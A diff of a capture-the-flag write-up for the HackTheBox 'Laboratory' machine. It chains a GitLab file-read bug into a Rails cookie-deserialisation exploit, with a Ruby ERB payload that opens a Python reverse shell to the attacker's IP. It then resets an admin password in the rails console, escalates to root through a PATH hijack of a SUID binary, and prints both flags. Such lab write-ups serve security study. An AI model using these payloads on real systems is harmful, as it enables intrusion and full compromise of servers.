@@ -157,10 +157,11 @@ https://git.laboratory.htb/autocomplete/users:
 ```
 
 ## Maybe we can exploit (LFI+RCE):
-https://hackerone.com/reports/827052
-https://vimeo.com/422686763
+[Gitlab LFI + RCE](https://hackerone.com/reports/827052)
+[Russian RCEs VImeo channel](https://vimeo.com/422686763)
 
-## Its broken...
+# LFI
+## LFI. Its broken...
 /etc/passwd:
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -290,14 +291,14 @@ request = ActionDispatch::Request.new(Rails.application.env_config)
 request.env["action_dispatch.cookies_serializer"] = :marshal
 cookies = request.cookie_jar
 
-erb = ERB.new("<%= `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.147\",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &` %>")
+erb = ERB.new("<%= `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.48\",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &` %>")
 depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
 cookies.signed[:cookie] = depr
 puts cookies[:cookie]
 ```
 ```
 root@gitlab:/# nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
-rroot@gitlab:/# gitlab-rails console
+root@gitlab:/# gitlab-rails console
 --------------------------------------------------------------------------------
  GitLab:       12.9.0 (9a382ff2c82) FOSS
  GitLab Shell: 12.0.0
@@ -346,264 +347,7 @@ in another shell:
 ```
 ┌──(kali㉿kali)-[~]
 └─$ curl -vvv https://git.laboratory.htb/users/sign_in -k -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69"
-*   Trying 10.10.10.216:443...
-* Connected to git.laboratory.htb (10.10.10.216) port 443 (#0)
-* ALPN, offering h2
-* ALPN, offering http/1.1
-* successfully set certificate verify locations:
-*   CAfile: /etc/ssl/certs/ca-certificates.crt
-  CApath: /etc/ssl/certs
-* TLSv1.3 (OUT), TLS handshake, Client hello (1):
-* TLSv1.3 (IN), TLS handshake, Server hello (2):
-* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
-* TLSv1.3 (IN), TLS handshake, Certificate (11):
-* TLSv1.3 (IN), TLS handshake, CERT verify (15):
-* TLSv1.3 (IN), TLS handshake, Finished (20):
-* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
-* TLSv1.3 (OUT), TLS handshake, Finished (20):
-* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
-* ALPN, server accepted to use http/1.1
-* Server certificate:
-*  subject: CN=laboratory.htb
-*  start date: Jul  5 10:39:28 2020 GMT
-*  expire date: Mar  3 10:39:28 2024 GMT
-*  issuer: CN=laboratory.htb
-*  SSL certificate verify result: self signed certificate (18), continuing anyway.
-> GET /users/sign_in HTTP/1.1
-> Host: git.laboratory.htb
-> User-Agent: curl/7.72.0
-> Accept: */*
-> Cookie: experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69
-> 
-* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
-* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
-* old SSL session ID is stale, removing
-* Mark bundle as not supporting multiuse
-< HTTP/1.1 200 OK
-< Date: Thu, 24 Dec 2020 01:42:25 GMT
-< Server: nginx
-< Content-Type: text/html; charset=utf-8
-< Vary: Accept-Encoding
-< Cache-Control: max-age=0, private, must-revalidate
-< Etag: W/"32f29fd5a6784919d009e97f9592ef5a"
-< Referrer-Policy: strict-origin-when-cross-origin
-< X-Content-Type-Options: nosniff
-< X-Download-Options: noopen
-< X-Frame-Options: DENY
-< X-Permitted-Cross-Domain-Policies: none
-< X-Request-Id: nvu8fWRxEz6
-< X-Runtime: 0.367507
-< X-Ua-Compatible: IE=edge
-< X-Xss-Protection: 1; mode=block
-< Strict-Transport-Security: max-age=31536000
-< Referrer-Policy: strict-origin-when-cross-origin
-< Set-Cookie: experimentation_subject_id=IiI%3D--b645bf5e17ecf295f4e614b37fedef6aa712dc32; path=/
-< Set-Cookie: _gitlab_session=f3ae89cdbdb20800a5b0857f514bbb66; path=/; expires=Thu, 24 Dec 2020 03:42:25 -0000; HttpOnly
-< Transfer-Encoding: chunked
-< 
-<!DOCTYPE html>
-<html class="devise-layout-html">
-<head prefix="og: http://ogp.me/ns#">
-<meta charset="utf-8">
-<meta content="IE=edge" http-equiv="X-UA-Compatible">
-<meta content="object" property="og:type">
-<meta content="GitLab" property="og:site_name">
-<meta content="Sign in" property="og:title">
-<meta content="GitLab Community Edition" property="og:description">
-<meta content="http://git.laboratory.htb/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
-<meta content="64" property="og:image:width">
-<meta content="64" property="og:image:height">
-<meta content="http://git.laboratory.htb/users/sign_in" property="og:url">
-<meta content="summary" property="twitter:card">
-<meta content="Sign in" property="twitter:title">
-<meta content="GitLab Community Edition" property="twitter:description">
-<meta content="http://git.laboratory.htb/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
-
-<title>Sign in · GitLab</title>
-<meta content="GitLab Community Edition" name="description">
-<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
-<link rel="stylesheet" media="all" href="/assets/application-4a081f9e3a60a0e580cad484d66fbf5a1505ad313280e96728729069f87f856e.css" />
-<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
-
-
-<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-3144068cf4f603d290f553b653926358ddcd02493b9728f62417682657fc58c0.css" />
-<script>
-//<![CDATA[
-window.gon={};
-//]]>
-</script>
-
-
-<script src="/assets/webpack/runtime.f97c5e2d.bundle.js" defer="defer"></script>
-<script src="/assets/webpack/main.e4cc9ed0.chunk.js" defer="defer"></script>
-<script src="/assets/webpack/commons~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.sessions~pages.sessions.new.c3421b50.chunk.js" defer="defer"></script>
-<script src="/assets/webpack/pages.sessions.new.859c63c5.chunk.js" defer="defer"></script>
-
-<meta name="csrf-param" content="authenticity_token" />
-<meta name="csrf-token" content="lsU5trlkfKgJV17AsxeMgsyQSY7OKWZX8w3UIgDNyMS0wEJ85lrrYde9EI6VxIc+SO7vi66nZ6cm1MZebb7DFQ==" />
-
-<meta content="origin-when-cross-origin" name="referrer">
-<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
-<meta content="#474D57" name="theme-color">
-<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
-<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
-<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
-<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
-<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
-<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
-<meta content="#30353E" name="msapplication-TileColor">
-
-
-
-
-</head>
-
-<body class="application gl-browser-generic gl-platform-other login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
-
-<script>
-//<![CDATA[
-gl = window.gl || {};
-gl.client = {"isGeneric":true,"isOther":true};
-
-
-//]]>
-</script>
-<div class="page-wrap">
-<header class="navbar fixed-top navbar-empty">
-<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
-  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
-  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
-  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
-  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
-  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
-  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
-  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
-</svg>
-
-</header>
-
-<div class="login-page-broadcast">
-
-
-</div>
-<div class="container navless-container">
-<div class="content">
-<div class="flash-container flash-container-page sticky">
-</div>
-
-<div class="row mt-3">
-<div class="col-sm-12">
-<h1 class="mb-3 font-weight-normal">
-GitLab Community Edition
-</h1>
-</div>
-</div>
-<div class="row mb-3">
-<div class="col-sm-7 order-12 order-sm-1 brand-holder">
-
-<h3 class="mt-sm-0">
-Open source software to collaborate on code
-</h3>
-<p>
-Manage Git repositories with fine-grained access controls that keep your code secure. Perform code reviews and enhance collaboration with merge requests. Each project can also have an issue tracker and a wiki.
-</p>
-
-</div>
-<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
-<div id="signin-container">
-<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
-<li class="nav-item" role="presentation">
-<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
-</li>
-<li class="nav-item" role="presentation">
-<a class="nav-link" data-qa-selector="register_tab" data-toggle="tab" data-track-event="click_button" data-track-label="sign_in_register" data-track-property="" data-track-value="" href="#register-pane" role="tab">Register</a>
-</li>
-</ul>
-
-<div class="tab-content">
-<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
-<div class="login-body">
-<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="vgoMhCxwOHM/N2FTgrzO0Jrw7MQpQ8P906eNKzmzFoOcD3dOc06vuuHdLx2kb8VsHo5KwUnNwg0Gfp9XVMAdUg==" /><div class="form-group">
-<label for="user_login" class="label-bold">Username or email</label>
-<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
-</div>
-<div class="form-group">
-<label class="label-bold" for="user_password">Password</label>
-<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
-</div>
-<div class="remember-me">
-<label for="user_remember_me">
-<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
-<span>Remember me</span>
-</label>
-<div class="float-right">
-<a href="/users/password/new">Forgot your password?</a>
-</div>
-</div>
-<div></div>
-<div class="submit-container move-submit-down">
-<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
-</div>
-</form>
-</div>
-</div>
-
-<div class="tab-pane login-box" id="register-pane" role="tabpanel">
-<div class="login-body">
-<form class="new_new_user gl-show-field-errors" id="new_new_user" aria-live="assertive" action="/users" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="g2KFClroLQA29/BPOFJURM7tGeY5/7+vxnhh7fagOTKhZ/7ABda6yegdvgEegV/4SpO/41lxvl8ToXORm9My4w==" /><div class="devise-errors">
-
-</div>
-<div class="name form-group">
-<label class="label-bold" for="new_user_name">Full name</label>
-<input class="form-control top js-block-emoji js-validate-length" data-max-length="255" data-max-length-message="Name is too long (maximum is 255 characters)." data-qa-selector="new_user_name_field" required="required" title="This field is required." type="text" name="new_user[name]" id="new_user_name" />
-</div>
-<div class="username form-group">
-<label class="label-bold" for="new_user_username">Username</label>
-<input class="form-control middle js-block-emoji js-validate-length js-validate-username" data-max-length="255" data-max-length-message="Username is too long (maximum is 255 characters)." data-qa-selector="new_user_username_field" pattern="[a-zA-Z0-9_\.][a-zA-Z0-9_\-\.]*[a-zA-Z0-9_\-]|[a-zA-Z0-9_]" required="required" title="Please create a username with only alphanumeric characters." type="text" name="new_user[username]" id="new_user_username" />
-<p class="validation-error gl-field-error-ignore field-validation hide">Username is already taken.</p>
-<p class="validation-success gl-field-error-ignore field-validation hide">Username is available.</p>
-<p class="validation-pending gl-field-error-ignore field-validation hide">Checking username availability...</p>
-</div>
-<div class="form-group">
-<label class="label-bold" for="new_user_email">Email</label>
-<input class="form-control middle" data-qa-selector="new_user_email_field" required="required" title="Please provide a valid email address." type="email" value="" name="new_user[email]" id="new_user_email" />
-</div>
-<div class="form-group">
-<label class="label-bold" for="new_user_email_confirmation">Email confirmation</label>
-<input class="form-control middle" data-qa-selector="new_user_email_confirmation_field" required="required" title="Please retype the email address." type="email" name="new_user[email_confirmation]" id="new_user_email_confirmation" />
-</div>
-<div class="form-group append-bottom-20" id="password-strength">
-<label class="label-bold" for="new_user_password">Password</label>
-<input class="form-control bottom" data-qa-selector="new_user_password_field" required="required" pattern=".{8,}" title="Minimum length is 8 characters." type="password" name="new_user[password]" id="new_user_password" />
-<p class="gl-field-hint text-secondary">Minimum length is 8 characters</p>
-</div>
-
-<div></div>
-<div class="submit-container">
-<input type="submit" name="commit" value="Register" class="btn-register btn" data-qa-selector="new_user_register_button" data-disable-with="Register" />
-</div>
-</form></div>
-</div>
-
-</div>
-</div>
-
-</div>
-</div>
-</div>
-</div>
-<hr class="footer-fixed">
-<div class="container footer-container">
-<div class="footer-links">
-<a href="/explore">Explore</a>
-<a href="/help">Help</a>
-<a href="https://about.gitlab.com/">About GitLab</a>
-</div>
-</div>
-
-</div>
-</body>
-</html>
+...
 * Connection #0 to host git.laboratory.htb left intact
 
 ```
@@ -617,14 +361,197 @@ $
 
 ```
 
-# Search user flag
+## Search user flag
 ```
-$ python3 -c "import pty; pty.spawn('/bin/bash')"
+$ python3 -c "import pty; pty.spawn('/bin/sh')"
 git@git:/assets$ export TERM=xterm
 
 ```
 
-### for tomorrow: include in payoad 
--> └─$ python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh', '/var/opt/gitlab
-/linpeas.sh')"
- 
+## Search/change info with ruby console
+[Updating a rails password via the rails console](https://jjasghar.github.io/blog/2014/05/02/updating-a-rails-password-via-the-rails-console/)
+[How to reset your root password](https://docs.gitlab.com/12.10/ee/security/reset_root_password.html)
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -l -p 1111                                                                                                                                                                                                                      1 ⨯
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c "import pty; pty.spawn('/bin/sh')"
+$ export TERM=xterm                                                                                                                                                                                                                        
+export TERM=xterm                                                                                                                                                                                                                          
+$ gitlab-rails console                                                                                                                                                                                                                     
+gitlab-rails console                                                                                                                                                                                                                       
+--------------------------------------------------------------------------------                                                                                                                                                           
+ GitLab:       12.8.1 (d18b43a5f5a) FOSS                                                                                                                                                                                                   
+ GitLab Shell: 11.0.0                                                                                                                                                                                                                      
+ PostgreSQL:   10.12                                                                                                                                                                                                                       
+--------------------------------------------------------------------------------                                                                                                                                                           
+Loading production environment (Rails 6.0.2)                                                                                                                                                                                               
+irb(main):001:0> u = User.find_by_id(1)                                                                                                                                                                                                    
+u = User.find_by_id(1)                                                                                                                                                                                                                     
+=> #<User id:1 @dexter>                                                                                                                                                                                                                    
+irb(main):002:0> u                                                                                                                                                                                               
+u
+=> #<User id:1 @dexter>
+irb(main):003:0> u.password = "password"
+u.password = "password"
+=> "password"
+irb(main):004:0> u.password_confirmation "password"
+u.password_confirmation "password"
+Traceback (most recent call last):
+        1: from (irb):4
+ArgumentError (wrong number of arguments (given 1, expected 0))
+irb(main):005:0> u.save
+u.save
+Enqueued ActionMailer::DeliveryJob (Job ID: f27b13ba-8ba1-4a88-92e3-edb226c3dd50) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f6f9b2e80d0 @uri=#<URI::GID gid://gitlab/User/1>>
+=> true
+```
+password changed, we can login:
+![Gitlab Dexter Login](./images/gitlab_login_dexter.png "Gitlab Dexter Login")
+
+## private key in SecureDocker repo
+save ssh private key in local and ssh to machine:
+```
+┌──(kali㉿kali)-[~/htb-laboratory/files]
+└─$ chmod 600 id_rsa                                                                                                                                                                                                                 130 ⨯
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/htb-laboratory/files]
+└─$ ssh -i id_rsa dexter@10.10.10.216 
+dexter@laboratory:~$
+```
+
+# USER FLAG
+```
+dexter@laboratory:~$ pwd
+/home/dexter
+dexter@laboratory:~$ cat user.txt 
+344d4c2b219076e3a170acd4346a3d01
+
+```
+## LinEnum - linpeas
+(sent with scp)
+Nano linpeas.sh, chmod +x and execute
+Interesting:
+- CVES:
+  - RTru64_UNIX_4.0g(CVE-2002-1614)
+  ```
+  -rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+
+  ```
+  - Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+  ```
+  -rwsr-xr-x 1 root   root             31K Aug 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+
+  ```
+- SUID:
+  - /usr/local/bin/docker-security:
+    ```
+    ====================================( Interesting Files )=====================================
+    [+] SUID - Check easy privesc, exploits and write perms                                                                                                                                                                         
+    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+    ...
+
+    -rwsr-xr-x 1 root   dexter           17K Aug 28 14:52 /usr/local/bin/docker-security
+
+    ```
+
+## Privilege escalation -> SUID + path variable
+[SUID and SGID](https://www.tecmint.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux/)
+[Privilege wscalation using path variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
+
+```
+dexter@laboratory:/usr/local/bin$ cat docker-security 
+ELF>p@�9@8
+          @@@@h�������   ���-�=�=X`�-�=�=����DDP�tdH H H <<Q�tdR�td�-�=�=▒▒/lib64/ld-linux-x86-64.so.2GNU�f��T�'N]�N�����fGN�e�mM%i x "setuidsystem__cxa_finalizesetgid__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmH�=��F/�DH�=�/H��/H9�tH�/H��teTa�����H�=i/H�5b/H)�H��H��?H��H�H��tH��.H����fD���=)/u/UH�=�.H��t��%�/h������%�/h������%�/f�1�I��^H��H���PTL�jH�
+                                                                                               H�=
+����H��������0zRx��{���UH��������������H�=������H�=�������]��AWL�=O,AVI��AUI��ATA��UH�-@,SL)�H��C���H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��chmod 700 /usr/bin/dockerchmod 660 /var/run/docker.sock<�����▒����(���X
+                ����+zRx
+                       $H���@F▒J
+n                               �?▒;*3$"D`��\=���3A�C
+D|X���]B�I▒�E �E(�D0�H8�G@j8A0A(B B▒B�p���P7
+��▒���0o
+�
+ ▒@H��  ▒������o����o���o����o�=6FV8@GCC: (Debian 10.1.0-6) 10.1.0���   �
+�
+
+`p� H � �=�=�=�?@▒0@@@▒��
+                         ��!7@@C�=jPv�=�������!����=��=��=�H �@�
+
+                                                                �s ▒0@7▒@@�>Rq▒0@~ �▒8@� ��]�H@wp+�@@�U3��▒@@� ▒"crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrydocker-security.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment�#��$6�� D��No
+                                                                                                                                                                                            00�^���o��k���o��z��▒�B��▒��  @�pp����      �  �H H <�� ������=�-��?��@�0@0@@@�0@0`00▒ �64�8
+```
+chmod without full path /usr/bin/chmod, we can elevate priviledges with that
+
+### tool pspy64
+[PSPY64](https://github.com/DominicBreuker/pspy)
+(sent with scp)
+in one shell:
+```
+dexter@laboratory:~$ ./pspy64 
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2020/12/27 16:16:33 CMD: UID=0    PID=961    | /lib/systemd/systemd-logind 
+2020/12/27 16:16:33 CMD: UID=0    PID=960    | /usr/lib/snapd/snapd 
+2020/12/27 16:16:33 CMD: UID=104  PID=959    | /usr/sbin/rsyslogd -n -iNONE 
+2020/12/27 16:16:33 CMD: UID=0    PID=958    | /usr/sbin/irqbalance --foreground 
+2020/12/27 16:16:33 CMD: UID=103  PID=944    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
+2020/12/27 16:16:33 CMD: UID=0    PID=943    | /usr/lib/accountsservice/accounts-daemon 
+2020/12/27 16:16:33 CMD: UID=0    PID=9      | 
+2020/12/27 16:16:33 CMD: UID=0    PID=868    | /usr/bin/vmtoolsd 
+2020/12/27 16:16:33 CMD: UID=0    PID=867    | /usr/bin/VGAuthService 
+2020/12/27 16:16:33 CMD: UID=998  PID=86156  | sleep 1 
+2020/12/27 16:16:33 CMD: UID=0    PID=86134  | 
+2020/12/27 16:16:33 CMD: UID=1000 PID=86115  | ./pspy64 
+...
+2020/12/27 16:16:40 CMD: UID=0    PID=86174  | ./docker-security 
+2020/12/27 16:16:40 CMD: UID=0    PID=86176  | sh -c chmod 700 /usr/bin/docker 
+2020/12/27 16:16:40 CMD: UID=0    PID=86175  | sh -c chmod 700 /usr/bin/docker 
+2020/12/27 16:16:40 CMD: UID=0    PID=86177  | sh -c chmod 660 /var/run/docker.sock 
+...
+```
+in other shell:
+```
+dexter@laboratory:/usr/local/bin$ ./docker-security 
+
+```
+interesting:
+```
+...
+2020/12/27 16:16:40 CMD: UID=0    PID=86174  | ./docker-security 
+2020/12/27 16:16:40 CMD: UID=0    PID=86176  | sh -c chmod 700 /usr/bin/docker 
+2020/12/27 16:16:40 CMD: UID=0    PID=86175  | sh -c chmod 700 /usr/bin/docker 
+2020/12/27 16:16:40 CMD: UID=0    PID=86177  | sh -c chmod 660 /var/run/docker.sock 
+...
+```
+
+# ROOT FLAG
+privilege escalation:
+```
+dexter@laboratory:~$ cd /tmp/
+dexter@laboratory:/tmp$ echo "python3 -c \"import pty; pty.spawn('/bin/sh')\"" > chmod
+dexter@laboratory:/tmp$ chmod +x chmod
+dexter@laboratory:/tmp$ PATH=$(pwd):$PATH
+dexter@laboratory:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
+dexter@laboratory:/tmp$ docker-security 
+# whoami
+root
+# cat /root/root.txt
+210cebe534d0b60900c24d740458a74f
+
+```
